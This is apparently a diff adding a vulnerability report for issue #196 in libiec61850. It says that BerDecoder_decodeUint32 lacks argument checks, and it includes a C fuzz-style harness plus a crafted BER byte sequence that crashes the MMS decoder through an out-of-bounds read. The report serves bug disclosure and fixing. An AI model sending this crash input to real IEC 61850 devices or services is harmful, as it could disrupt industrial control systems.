@@ -1,0 +1,23 @@
+issue #196
+
+BerDecoder_decodeUint32 in src/mms/asn1/ber_decode.c doesn't check passed arguments.
+intLen and bufPos can be large number, so following memory access buffer[bufPos+i] would segment fault.
+
+PoC
+
+#include <stdio.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <libiec61850/mms_value.h>
+uint8_t globalbuf[0x10000];
+int main(){
+    ssize_t readcount;
+    readcount = read(0, globalbuf, sizeof(globalbuf));
+    if( readcount <= 0 ){
+        return 0;
+    }
+    MmsValue *res = MmsValue_decodeMmsData(globalbuf, 0, (int)readcount, 0);
+    return 0;
+}
+
+<80><92><92><92><92><92><92><92><92><92><ba><ba><ba><ba><ba><ba><7f><ff><ff><ff>
